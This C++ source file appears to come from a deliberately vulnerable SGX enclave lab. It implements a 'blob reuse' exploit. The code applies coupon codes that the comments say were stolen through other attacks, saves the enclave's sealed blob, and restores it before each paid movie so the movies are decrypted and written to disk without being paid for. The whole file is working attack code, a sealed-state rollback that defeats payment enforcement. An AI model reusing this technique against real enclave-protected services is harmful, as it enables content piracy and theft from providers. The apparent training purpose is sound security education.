
#include "stdafx.h"
#include "exploits.h"
#include "common_enclave_actions.h"


void e3_blob_reuse(char* server_ip, int iport, char* library_folder)
{
	// create an enclave
	// copy the blob aside
	// get an epg
	// close an enclave
	// for all movies:
	// copy blob back
	// create enclave
	// read and save movie
	// close enclave
	// create an enclave
	if (!load_enclave())
	{
		printf("\nCan not load enclave ...");
		return;
	}
	// get an epg
	unsigned int i;
	size_t * ids = nullptr;
	bool *is_payed = nullptr;
	unsigned int num_of_movies = 0;
	if (!init_enclave(server_ip, library_folder, iport))
	{
		printf("\nCan not initialize enclave for getting EPG...");
		return;
	}
	if (!get_epg_info(&ids, &is_payed, &num_of_movies))
	{
		printf("\nCan not get EPG info. Is your server running ?");
		return;
	}
	// apply all coupons, assuming we got them byu one of other attacks, 
	// such as memory exfiltration or timing
	char *coupons[5] = 
	{
		"DVSE_CPN_10000000000000000000000",
		"DVSE_CPN_20000000000000000000000",
		"DVSE_CPN_30000000000000000000000",
		"DVSE_CPN_40000000000000000000000", 
		"DVSE_CPN_50000000000000000000000"
	};
	for (i = 0; i < 5; i++)
	{
		if (!apply_coupon(coupons[i]))
		{
			printf("\nSomethign wrong, can not apply the coupon.");
			return;
		}
	}

	// close enclave
	if (!unload_enclave())
	{
		printf("\nSomethign wrong, can not unload enclave.");
		return;
	}
	// blob is prepared, copy it back
	char filename[1024];
	snprintf(filename, 1024, "%s\\blob", library_folder);
	char filename_out[1024];
	snprintf(filename_out, 1024, "%s\\blob_out", library_folder);
	char command[1024 * 2 + 10];
	snprintf(command, 2048+10, "copy \"%s\" \"%s\"", filename, filename_out);
	system(command);
	snprintf(command, 2048 + 10, "copy \"%s\" \"%s\"", filename_out, filename);

	// for all payed movies

	for (i = 0; i < num_of_movies; i++)
	{
		// copy the full blob back
		system(command);
		//	create an enclave

		if (!load_enclave())
		{
			printf("\nCan not load enclave for movie %zd ...", ids[i]);
			return;
		}
		if (!init_enclave(server_ip, library_folder, iport))
		{
			printf("\nCan not initialize enclave for movie %zd ...", ids[i]);
			return;
		}
		//  prepare the movie
		if (!prepare_file(ids[i]))
		{
			printf("\nCan not download encrypted movie. Is your server running ?");
			return;
		}
		char filename_movie_out[1024];
		snprintf(filename_movie_out, 1024, "%s\\movie.decrypted.%zd", library_folder, ids[i]);

		//  read the file and store: coupons should give us a lot of coins
		extract_semi_allowed_file(ids[i], filename_movie_out);
		//  close enclave
		if (!unload_enclave())
		{
			printf("\nunload enclave. Is your server running ?");
			return;
		}
	}

}
